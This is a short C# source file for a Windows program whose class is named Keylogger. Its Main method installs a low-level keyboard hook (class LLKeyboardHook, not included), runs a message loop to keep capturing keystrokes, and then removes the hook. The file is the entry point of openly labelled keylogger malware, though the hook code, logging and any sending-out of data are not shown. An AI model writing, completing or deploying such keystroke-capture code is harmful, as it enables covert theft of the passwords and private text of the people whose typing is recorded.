using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace IP
{
    class Keylogger
    {
        static void Main(string[] args)
        {
            LLKeyboardHook hook = new LLKeyboardHook();
            hook.Install();
            Application.Run();
            hook.Uninstall();

        }
    }


}
